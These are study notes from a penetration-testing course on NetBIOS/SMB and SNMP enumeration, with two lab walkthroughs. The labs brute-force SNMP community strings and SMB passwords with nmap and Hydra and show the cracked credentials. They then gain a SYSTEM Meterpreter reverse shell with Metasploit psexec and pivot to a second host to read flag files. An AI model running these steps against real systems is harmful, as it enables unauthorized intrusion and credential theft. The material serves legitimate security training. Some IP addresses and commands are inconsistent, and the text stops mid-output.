# Network Security 

## Enumeration

### NetBIOS - Study Guide

NetBIOS is a set of Windows legacy protocols for the communication of devices (files, folders and printers) on a LAN.
(04/61) NetBIOS allows applications on different systems to communicate over the LAN.
It uses the following ports:
UDP 137 for name service;
UDP 138 for datagram service;
TCP 139 for session service.

(06/61) Name service (WINS): for translating NetBIOS names to IP addresses (similar to DNS).
`nbtstat -n` to show NetBIOS names on our machine.
(11/61) Datagram service: for sending/receiving messages to/from a NetBIOS name.
(13/61) Session service (NBSS): for establishing a TCP connection in order to exchange data. Once the session has been established, the workstations use the SMB protocol.
SMB is used to share files, folders, disks and printers across a network, and relies on NetBIOS for the transport level.
From Windows 2000 there is no more the need to run SMB over the NetBIOS sessions.

(17/61) *nbtstat* is a Windows tool used to enumerate information using NetBIOS. Its options:
```
-a (adapter status) 	Lists the remote machine's name table given its name
-A (Adapter status) 	Lists the remote machine's name table given its IP
-c (cache)				Lists NBT's cache of remote [machine] names and their IP addresses
-n (names)				Lists local NetBIOS names.
-r (resolved)			Lists names resolved by broadcast and via WINS
-R (Reload)				Purges and reloads the remote cache name table
-S (Sessions)			Lists sessions table with the destination IP addresses
-s (sessions)			Lists sessions table converting destination IP addresses to computer NETBIOS names
-RR (ReleaseRefresh)	Sends Name Release packets to WINS and starts Refr
```
In the name table are present the computer names and the domain names.
(23/61) *nbtscan* is a Linux tool instead, and it is able to scan multiple addresses: `nbtscan -v <NetworkTargetIP>`.
(25/61) The preceding tools use the NBNS service (useful for searching them on Wireshark).

(26/61) Microsoft net command:
`net view <TargetIP>`: to list the resources shared by a computer on the network.
`net use \\<TargetIP/ComputerName>\<ResourceName>`: to connect/disconnect a computer from a shared resource to later explore it.
(31/61) On Linux: `smbclient -L <TargetIP>`: to list the shared resources (also hidden ones suffixed with `$`), `sudo mount.cifs //<TargetIP>/<ResourceName> /media/K_share user=,pass=`.
(32/61) Hidden shares (suffixed with `$`) are the default administrative shares, so we can't probably access them without username and password.

(35/61) *Null session*: is an old attack performed on Windows 2000/NT for accessing information without providing username and password (usually NetBIOS sessions required an authentication of the user).
`IPC$` is a system resource used for the communication between processes.
To test if a machine is vulnerable to null session attack: `net use \\<TargetIP>\IPC$ "" /user:""`, in which we try to access the `IPC$` resource without providing password and username (no-user, anonymous one).

Once we have established the connection we can gather information using other tools.
(40/61) Winfingerprint: is a GUI tool to enumerate users available on the machine, password policies, users SID, shares.
(44/61) Winfo: `winfo <TargetIP> -n`, `-n` to establish a null session.
(51/61) Enum4linux: `enum4linux -a -v <TargetIP>`, `-a` to perform all simple enumerations.
(54/61) Rpcclient: `rpcclient -N -U "" <TargetIP>` to establish a null session.

### NetBIOS and Null Session - Video

`nmap -sS <TargetIP> -p 135`: to check if NetBIOS is up and running on the target machine.
`nbtstat -A <TargetIP>`: to list the target machine's name table containing the devices names on the network.
`net view <TargetIP>`: to list the resources shared by the target computer on the network.
`net use \\<TargetIP/ComputerName>\<ResourceName>`: to connect/disconnect a computer from a shared resource to later explore it (for now we can't access the resources without authentication).
`net use \\<TargetIP/ComputerName>\IPC$ "" /user:""`: to perform a null session attack.
In order to get more information we use tools in combination with the SID found before:
`sid2user.exe \\<TargetComputerName> <SIDValue>`: to obtain information (name, domain, SID type) from the SID values (we have to replace dashes with spaces in the SID value).
We can use DumpSec to automatically dump information like usernames, file systems, groups. Here we just need to select the target IP/name and the information we want to try to obtain.
An alternative for Linux is: `enum4linux -a -v <TargetIP>`, `-a` to perform a full scan.
`smbclient -L <TargetIP>`: to list the shared resources.
`smbclient \\\\<TargetIP>\\<ResourceName>` to access the shared resource.
`get <Filename> <LocalPath/Filename>`: to copy a shared file in the local machine.

### SNMP - Study Guide

SNMP is a protocol to exchange management information between network devices (printers, routers, switches, servers) that can be used to configure them.
(03/43) In the SNMP protocol there is a manager (usually a system administrator) and some agents. Agents wait for commands (read to monitor, write to configure) from the manager or send traps (critical messages) to the manager.
(07/43) General messages (read/write) are sent on port UDP 161, trap messages on port UDP 162.
(08/43) SNMP messages contain a header in which there is the SNMP version and the community string (a sort of authentication password) that can be of two default types: public that allows read rights, private that allows write rights.
(10/43) MIB: is a hierarchical structure (tree) to organize the information (objects) that a SNMP device can handle. Every object has an identifier called OID, this one has a tree structure (following the MIB) from the root to the leaf.

(14/43) SNMP attacks:
- flooding (DOS attack): spoofing an agent and sending a lot of traps.
- community: using default community strings to gain privileged access to the systems.
- brute force: like before, but guessing the available community strings with a tool.
(16/43) To obtain the community strings we can:
- sniff the traffic (SNMPv1 and SNMPv2 utilize communications in clear text).
- use a dictionary attack (beware that IDSs can notice the multiple login attempts).

(19/43) *Snmpwalk* is a tool to query the MIB in order to get all (walk) the information about a device on the network (network interfaces, IP addresses, usernames, groupnames, hardware, software, OS information).
`snmpwalk <TargetIP> -v <SNMPVersion> -c <CommunityString>`: where `-v` is used to specify the SNMP version, while `-c` sets the community strings (if we already know it).
Snmpwalk can also be used with a single MIB object or even an exact OID.
`snmpwalk <TargetIP> -v <SNMPVersion> -c <CommunityString> <SpecificOID>`: using a specific OID (e.g. `hrSWInstalledName` to list only the installed software on the machine). 

(28/43) *Snmpset* is a tool to modify (set) the device configuration.
`snmpwalk <TargetIP> -v <SNMPVersion> -c <CommunityString> <SpecificOID>`: to get the current value for the specific OID object.
`snmpset <TargetIP> -v <SNMPVersion> -c <CommunityString> <SpecificOID> <ObjectType> <ObjectValue>`: to set a type and a new value for a specific OID object. Available types:
```
i: INTEGER, u: unsigned INTEGER, t: TIMETICKS, a: IPADDRESS
o: OBJID, s: STRING, x: HEX STRING, d: DECIMAL STRING, b: BITS
U: unsigned int64, I: signed int64, F: float, D: double
```

(33/43) To list the nmap SNMP available scripts: `ls -l /usr/share/nmap/scripts | grep -i snmp`.
`nmap -sU --script snmp-win32-services <TargetIP> -p 161`: to enumerate the available SNMP services on a target machine.
`nmap -sU --script snmp-brute <TargetIP> -p 161`: to brute force the community strings using a default wordlist. The wordlist can be also changed with `--script-args snmp-brute.communitiesdb=<NewWordlist>` (e.g. with the seclists one: `/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt`).

### SNMP Enumeration - Video

Snmpwalk:
`snmpwalk -v 2c -c public 192.168.1.2`: all the resulting information can be used to understand much more about the target machine, but also can reveal possible vulnerabilities;
`snmpwalk -v 2c -c public 192.168.1.2 hrSWInstalledName`: to get just the information about the installed software specifing the corresponding target OID;
`snmpwalk -v 2c -c public 192.168.1.2 hrMemorySize`: to get the size of the RAM on the target machine.

Snmpset:
`snmpset -v 2c -c public 192.168.1.2 sysContact s els`: to set the sysContact variable of the target machine.

Nmap:
`nmap -sU --script snmp-win32-services 192.168.1.2 -p 161`: to enumerate Windows running services through SNMP on the target machine;
`nmap -sU --script snmp-brute --script.args snmp.brute=/usr/share/seclists/Misc/snmp-common-community-strings.txt 192.168.1.2 -p 161`: to brute force the available community strings for a target device using a specific wordlist;
`nmap -sU --script snmp-win32-users 192.168.1.2 -p 161`: to enumerate the available users on the target machine.

### NetBIOS Hacking - Lab

You will learn to enumerate the SMB service and exploit it using different brute-forcing and exploitation tools. Also, it covers pivoting and how to leverage net utility to mount the shared drives in the pivot network.

In this lab environment, the user will access a Kali GUI instance. A vulnerable SMB service can be accessed using the tools installed on Kali on http://demo.ine.local and http://demo1.ine.local

Objective: Exploit both the target and find the flag!

The best tools for this lab are:
- Metasploit Framework
- Nmap
- Hydra
- Proxychains

---

**Step 1**: Check if the provided machines are reachable.

`ping demo.ine.local -c 3`:
```
PING demo.ine.local (10.4.28.183) 56(84) bytes of data.
64 bytes from demo.ine.local (10.4.28.183): icmp_seq=1 ttl=125 time=8.08 ms
64 bytes from demo.ine.local (10.4.28.183): icmp_seq=2 ttl=125 time=7.58 ms
64 bytes from demo.ine.local (10.4.28.183): icmp_seq=3 ttl=125 time=7.49 ms

--- demo.ine.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms ←
rtt min/avg/max/mdev = 7.492/7.715/8.079/0.259 ms
```

`ping demo1.ine.local -c 3`:
```
PING demo1.ine.local (10.4.28.30) 56(84) bytes of data.

--- demo1.ine.local ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2039ms ←
```

Only one machine is reachable: demo.ine.local.
We also found the targets IP addresses:
demo.ine.local:		10.4.28.183
demo1.ine.local:	10.4.28.30

**Step 2**: Check open ports on the target machines.

`nmap -sS -Pn -n demo.ine.local demo1.ine.local`:
```
Nmap scan report for demo.ine.local (10.4.28.183)
Host is up (0.0082s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc ←
139/tcp   open  netbios-ssn ←
445/tcp   open  microsoft-ds ←
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown

Nmap scan report for demo1.ine.local (10.4.28.30)
Host is up.
All 1000 scanned ports on demo1.ine.local (10.4.28.30) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap done: 2 IP addresses (2 hosts up) scanned in 6.36 seconds
```

All the ports expose core services of the Windows operating system (i.e. SMB, RDP, RPC).
In this lab, we will perform attacks on the SMB service.
By default, the SMB service uses either port 139 or 445.

**Step 3**: Let's run nmap on ports 139 and 445 to get more information about the protocol.

`nmap -sV demo.ine.local -p139,445`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-25 15:24 IST
Nmap scan report for demo.ine.local (10.4.28.183)
Host is up (0.0075s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn ←
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds ←
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
```

**Step 4**: Let's identify all the supported SMB versions on the target machine.

`ls -l /usr/share/nmap/scripts/ | grep "smb-"`:
```
-rw-r--r-- 1 root root  45K Oct 26  2021 smb-brute.nse
-rw-r--r-- 1 root root 5.2K Oct 26  2021 smb-double-pulsar-backdoor.nse
-rw-r--r-- 1 root root 4.8K Oct 26  2021 smb-enum-domains.nse
-rw-r--r-- 1 root root 5.9K Oct 26  2021 smb-enum-groups.nse
-rw-r--r-- 1 root root 7.9K Oct 26  2021 smb-enum-processes.nse
-rw-r--r-- 1 root root  27K Oct 26  2021 smb-enum-services.nse
-rw-r--r-- 1 root root  12K Oct 26  2021 smb-enum-sessions.nse
-rw-r--r-- 1 root root 6.8K Oct 26  2021 smb-enum-shares.nse
-rw-r--r-- 1 root root  13K Oct 26  2021 smb-enum-users.nse
-rw-r--r-- 1 root root 1.7K Oct 26  2021 smb-flood.nse
-rw-r--r-- 1 root root 7.3K Oct 26  2021 smb-ls.nse
-rw-r--r-- 1 root root 8.6K Oct 26  2021 smb-mbenum.nse
-rw-r--r-- 1 root root 8.1K Oct 26  2021 smb-os-discovery.nse
-rw-r--r-- 1 root root 4.9K Oct 26  2021 smb-print-text.nse
-rw-r--r-- 1 root root 1.8K Oct 26  2021 smb-protocols.nse
-rw-r--r-- 1 root root  63K Oct 26  2021 smb-psexec.nse
-rw-r--r-- 1 root root 5.1K Oct 26  2021 smb-security-mode.nse
-rw-r--r-- 1 root root 2.4K Oct 26  2021 smb-server-stats.nse
-rw-r--r-- 1 root root  14K Oct 26  2021 smb-system-info.nse
-rw-r--r-- 1 root root 7.4K Oct 26  2021 smb-vuln-conficker.nse
-rw-r--r-- 1 root root 6.3K Oct 26  2021 smb-vuln-cve2009-3103.nse
-rw-r--r-- 1 root root  23K Oct 26  2021 smb-vuln-cve-2017-7494.nse
-rw-r--r-- 1 root root 6.4K Oct 26  2021 smb-vuln-ms06-025.nse
-rw-r--r-- 1 root root 5.3K Oct 26  2021 smb-vuln-ms07-029.nse
-rw-r--r-- 1 root root 5.6K Oct 26  2021 smb-vuln-ms08-067.nse
-rw-r--r-- 1 root root 5.6K Oct 26  2021 smb-vuln-ms10-054.nse
-rw-r--r-- 1 root root 7.1K Oct 26  2021 smb-vuln-ms10-061.nse
-rw-r--r-- 1 root root 7.2K Oct 26  2021 smb-vuln-ms17-010.nse
-rw-r--r-- 1 root root 4.3K Oct 26  2021 smb-vuln-regsvc-dos.nse
-rw-r--r-- 1 root root 6.5K Oct 26  2021 smb-vuln-webexec.nse
-rw-r--r-- 1 root root 5.0K Oct 26  2021 smb-webexec-exploit.nse
```

`nmap --script smb-protocols demo.ine.local -p139,445`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-25 15:29 IST
Nmap scan report for demo.ine.local (10.4.28.183)
Host is up (0.0075s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default] ←
|     2.0.2
|     2.1
|     3.0
|_    3.0.2

Nmap done: 1 IP address (1 host up) scanned in 5.62 seconds
```

SMBv1 is used in the old Windows operating system. However, it is still present in the latest Windows OS too. We can disable/enable all SMB versions by modifying the windows registries.

SMBv1 onwards, all the versions are reasonability secure. They provide many security protections (i.e. disabling insecure guest logins, pre-authentication integrity, secure dialect negotiation, encryption)

**Step 5**: Let's run the nmap script to find the smb protocol security level.

`nmap --script smb-security-mode demo.ine.local -p139,445`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-25 15:34 IST
Nmap scan report for demo.ine.local (10.4.28.183)
Host is up (0.0078s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default) ←

Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds
```

This clarifies that the nmap script uses the guest user for all the smb script scan. We can define another user also. But, we need valid credentials to access the target machine.
The guest user is the default user available on all the windows operating systems. 

**Step 6**: Let's find that we have the Null Session (anonymous access) on the target machine.

*smbclient* is a client that can 'talk' to an SMB/CIFS server. It offers an interface similar to that of the ftp program. Operations include things like getting files from the server to the local machine, putting files from the local machine to the server, retrieving directory information from the server and so on.

`smbclient -L demo.ine.local`:
```
Enter WORKGROUP\root's password: 
Anonymous login successful ←

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Documents       Disk      
        Downloads       Disk      
        IPC$            IPC       Remote IPC
        print$          Disk      Printer Drivers
        Public          Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.4.28.183 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

**Step 7**: Let's dump all the present Windows users via SMB protocol.

`nmap --script smb-enum-users demo.ine.local -p139,445`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-25 15:39 IST
Nmap scan report for demo.ine.local (10.4.28.183)
Host is up (0.0078s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-users: 
|   ATTACKDEFENSE\admin (RID: 1009) ←
|     Flags:       Normal user account, Password does not expire
|   ATTACKDEFENSE\Administrator (RID: 500) ←
|     Description: Built-in account for administering the computer/domain
|     Flags:       Normal user account, Password does not expire
|   ATTACKDEFENSE\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|     Flags:       Normal user account, Account disabled, Password does not expire, Password not required
|   ATTACKDEFENSE\root (RID: 1010) ←
|_    Flags:       Normal user account, Password does not expire

Nmap done: 1 IP address (1 host up) scanned in 2.76 seconds
```

**Step 8**: Let's find the valid password for `admin`, `administrator`, and `root` user.

`nano /root/Desktop/users.txt`:
```
admin
administrator
root
```

`hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`:
```
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-13 21:06:20
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 3027 login tries (l:3/p:1009), ~3027 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: admin   password: tinkerbell ←
[445][smb] host: demo.ine.local   login: administrator   password: password1 ←
[445][smb] host: demo.ine.local   login: root   password: elizabeth ←
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-13 21:06:24
```

**Step 9**: Let's use the Metasploit framework and the `psexec` exploit module to gain a Meterpreter shell using the `administrator` user valid password.

`msfconsole -q`, `search psexec`, `use exploit/windows/smb/psexec`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `show options`, `set RHOSTS demo.ine.local`, `set SMBUser administrator`, `set SMBPass password1`, `exploit`.

`sysinfo`:
```
Computer        : ATTACKDEFENSE
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

`migrate -N explorer.exe`:
```
[*] Migrating from 2240 to 2584...
[*] Migration completed successfully. ←
```

**Step 10**: Let's find and read the flag.

`shell`, `where /R C:\ flag*`:
```
C:\Users\Administrator\Documents\FLAG1.txt ←
```

`type C:\Users\Administrator\Documents\FLAG1.txt`:
```
8de67f44f49264e6c99e8a8f5f17110c ←
```

**Step 11**: Let's ping demo1.ine.local (`10.0.22.69`) and verify that it is reachable from the second machine.

`ping 10.4.28.92 -n 3`:
```
Pinging 10.4.28.92 with 32 bytes of data:
Reply from 10.4.28.92: bytes=32 time<1ms TTL=128
Reply from 10.4.28.92: bytes=32 time<1ms TTL=128
Reply from 10.4.28.92: bytes=32 time<1ms TTL=128

Ping statistics for 10.4.28.92:
    Packets: Sent = 3, Received = 3, Lost = 0 (0% loss), ←
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

**Step 12**: Let's pivoting.

`exit`, `run autoroute -s 10.4.28.0/24`, `run autoroute -p`:
```
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.4.26.0          255.255.255.0      Session 1
```

`background`, `proxychains --version`:
```
[proxychains] config file found: /etc/proxychains4.conf ←
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
proxychains can't load process....: No such file or directory
```

`cat /etc/proxychains4.conf`:
```
...

[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4		127.0.0.1	9050 ←
```

`search socks`, `use auxiliary/server/socks_proxy`, `show options`, `set SRVPORT 9050`, `set VERSION 4a`, `exploit`, `jobs`.

**Step 13**: Let's run nmap with proxychains to scan SMB ports on the pivot machine (i.e. `demo1.ine.local`).

`proxychains nmap -sS -Pn demo1.ine.local -p135,139,445`:
```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-14 16:19 IST
Nmap scan report for demo1.ine.local (10.4.31.68)
Host is up.

PORT    STATE    SERVICE
135/tcp filtered msrpc ←
139/tcp filtered netbios-ssn ←
445/tcp filtered microsoft-ds ←

Nmap done: 1 IP address (1 host up) scanned in 3.17 seconds
```

`proxychains nmap -sT -Pn demo1.ine.local -p135,139,445`:
```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-14 16:20 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.31.68:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.31.68:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.4.31.68:139  ...  OK
Nmap scan report for demo1.ine.local (10.4.31.68)
Host is up (0.073s latency).

PORT    STATE SERVICE
135/tcp open  msrpc ←
139/tcp open  netbios-ssn ←
445/tcp open  microsoft-ds ←

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
```

**Step 14**: Let's find all resources shared by the `demo1.ine.local` machine.

`sessions -i 1`, `shell`, `net view 10.4.28.92`:
```
Shared resources at 10.4.28.92


Share name  Type  Used as  Comment  

-------------------------------------------------------------------------------
Documents   Disk ←
K           Disk ←
The command completed successfully.
```

This time we can see two shared resources. `Documents` and `K` drive. And, this confirms that pivot target (`demo1.ine.local`) allows Null Sessions, so we can access the shared resources.

Now, we can map the shared drive to the `demo.ine.local` machine using the net command.

`net use D: \\10.4.28.92\Documents`, `net use E: \\10.4.28.92\K`.

`dir E:`:
```
 Volume in drive E is New Volume
 Volume Serial Number is E654-107F

 Directory of E:\

11/17/2021  03:34 PM           327,590 wallpaper.png
               1 File(s)        327,590 bytes
               0 Dir(s)  10,951,335,936 bytes free
```

`dir D:`:
```
 Volume in drive D has no label.
 Volume Serial Number is 5CD6-020B

 Directory of D:\

01/04/2022  05:22 AM    <DIR>          .
01/04/2022  05:22 AM    <DIR>          ..
01/04/2022  05:07 AM             1,425 Confidential.txt
01/04/2022  05:22 AM                70 FLAG2.txt ←
               2 File(s)          1,495 bytes
               2 Dir(s)   6,607,810,560 bytes free
```

`type D:\\FLAG2.txt`:
```
c8f58de67f44f49264e6c99e8f17110c ←
```

---

### SNMP Analysis - Lab

In this lab, you will learn to scan the target machine to discover SNMP service and perform information gathering using SNMP nmap scripts and other tools.

In this lab environment, the user will get access to a Kali GUI instance. An instance of the vulnerable service can be accessed using the tools installed on Kali at http://demo.ine.local

Objective: Exploit the target to gain the shell and find the flag!

The best tools for this lab are:
- Nmap
- Metasploit Framework
- snmpwalk
- Hydra

---

**Step 1**.

`ping demo.ine.local -c 3`:
```
PING demo.ine.local (10.4.24.192) 56(84) bytes of data.
64 bytes from demo.ine.local (10.4.24.192): icmp_seq=1 ttl=125 time=10.9 ms
64 bytes from demo.ine.local (10.4.24.192): icmp_seq=2 ttl=125 time=9.22 ms
64 bytes from demo.ine.local (10.4.24.192): icmp_seq=3 ttl=125 time=9.33 ms

--- demo.ine.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 9.220/9.829/10.935/0.783 ms
```

`nmap -sS demo.ine.local`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-14 17:45 IST
Nmap scan report for demo.ine.local (10.4.26.58)
Host is up (0.0088s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc ←
139/tcp  open  netbios-ssn ←
445/tcp  open  microsoft-ds ←
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
```

`nmap -sU demo.ine.local -p161,162`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-14 16:54 IST
Nmap scan report for demo.ine.local (10.4.24.192)
Host is up (0.0098s latency).

PORT    STATE  SERVICE
161/udp open   snmp ←
162/udp closed snmptrap

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

`nmap -sU -sV demo.ine.local -p161`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-14 17:11 IST
Nmap scan report for demo.ine.local (10.4.24.192)
Host is up (0.0097s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public) ←
Service Info: Host: AttackDefense

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.65 seconds
```

**Step 2**.

`ls -l /usr/share/nmap/scripts/ | grep "snmp"`:
```
-rw-r--r-- 1 root root 7.7K Oct 26  2021 snmp-brute.nse ←
-rw-r--r-- 1 root root 4.3K Oct 26  2021 snmp-hh3c-logins.nse
-rw-r--r-- 1 root root 5.1K Oct 26  2021 snmp-info.nse
-rw-r--r-- 1 root root  28K Oct 26  2021 snmp-interfaces.nse
-rw-r--r-- 1 root root 5.9K Oct 26  2021 snmp-ios-config.nse
-rw-r--r-- 1 root root 4.1K Oct 26  2021 snmp-netstat.nse
-rw-r--r-- 1 root root 4.4K Oct 26  2021 snmp-processes.nse
-rw-r--r-- 1 root root 1.9K Oct 26  2021 snmp-sysdescr.nse
-rw-r--r-- 1 root root 2.6K Oct 26  2021 snmp-win32-services.nse
-rw-r--r-- 1 root root 2.7K Oct 26  2021 snmp-win32-shares.nse
-rw-r--r-- 1 root root 4.7K Oct 26  2021 snmp-win32-software.nse ←
-rw-r--r-- 1 root root 2.0K Oct 26  2021 snmp-win32-users.nse ←
```

`nmap -sU demo.ine.local -p161 --script snmp-win32-software`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-14 17:26 IST
Nmap scan report for demo.ine.local (10.4.26.58)
Host is up (0.0092s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-win32-software: 
|   AWS PV Drivers; 2020-09-09T03:39:12
|   AWS Tools for Windows; 2020-09-09T03:45:04
|   Amazon SSM Agent; 2020-09-09T03:38:42
|   Amazon SSM Agent; 2020-09-09T03:38:38
|   Mozilla Firefox 82.0.2 (x64 en-US); 2020-11-07T07:47:26
|   Mozilla Maintenance Service; 2020-11-07T07:47:26
|_  aws-cfn-bootstrap; 2020-06-10T05:37:48

Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
```

However, analyzing the results revealed that no significant or interesting information was found.

**Step 3**.

`nmap --script-help snmp-brute`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-14 16:59 IST

snmp-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/snmp-brute.html
  Attempts to find an SNMP community string by brute force guessing.

  This script opens a sending socket and a sniffing pcap socket in parallel
  threads. The sending socket sends the SNMP probes with the community strings,
  while the pcap socket sniffs the network for an answer to the probes. If
  valid community strings are found, they are added to the creds database and
  reported in the output.

  The script takes the <code>snmp-brute.communitiesdb</code> argument that ←
  allows the user to define the file that contains the community strings to
  be used. If not defined, the default wordlist used to bruteforce the SNMP
  community strings is <code>nselib/data/snmpcommunities.lst</code>. In case
  this wordlist does not exist, the script falls back to
  <code>nselib/data/passwords.lst</code>

  No output is reported if no valid account is found.
```

`tree /usr/share/seclists | grep "community"`:
```
│	│	├── common-snmp-community-strings-onesixtyone.txt
│	│	├── common-snmp-community-strings.txt
```

`locate common-snmp-community-strings.txt`:
```
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt ←
```

`nmap -sU demo.ine.local -p161 --script snmp-brute --script-args snmp-brute.communitiesdb="/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-14 17:09 IST
Nmap scan report for demo.ine.local (10.4.24.192)
Host is up (0.0092s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute: 
|   public - Valid credentials ←
|   private - Valid credentials ←
|_  secret - Valid credentials ←

Nmap done: 1 IP address (1 host up) scanned in 5.83 seconds
```

**Step 4**.

`snmpwalk -v 1 -c secret demo.ine.local`.

We were able to gather a lot of information via SNMP. But, this isn't in a proper readable format. We need to take the help of other tools (i.e. nmap SNMP scripts) for specific information.

**Step 5**.

`nmap -sU demo.ine.local -p161 --script snmp-win32-users`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-14 17:31 IST
Nmap scan report for demo.ine.local (10.4.26.58)
Host is up (0.0088s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-win32-users: 
|   Administrator ←
|   DefaultAccount
|   Guest
|   WDAGUtilityAccount
|_  admin ←

Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
```

`nano /root/Desktop/users.txt`:
```
administrator
admin
```

`hydra -L /root/Desktop/users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`:
```
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-14 17:45:15
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 2018 login tries (l:2/p:1009), ~2018 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: administrator   password: elizabeth ←
[445][smb] host: demo.ine.local   login: admin   password: tinkerbell ←
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-14 17:45:19
```

**Step 6**.

`msfconsole -q`, `search psexec`, `use `, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `show options`, `set RHOSTS demo.ine.local`, `set SMBUser administrator`, `set SMBPass elizabeth`, `exploit`.

`sysinfo`:
```
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM
```

`migrate -N explorer.exe`:
```
[*] Migrating from 4828 to 4236...
[*] Migration completed successfully.
```

**Step 7**.

`shell`, `where /R C: "flag*"`:
```
C:\FLAG1.txt
```

`type C:\FLAG1.txt`:
```
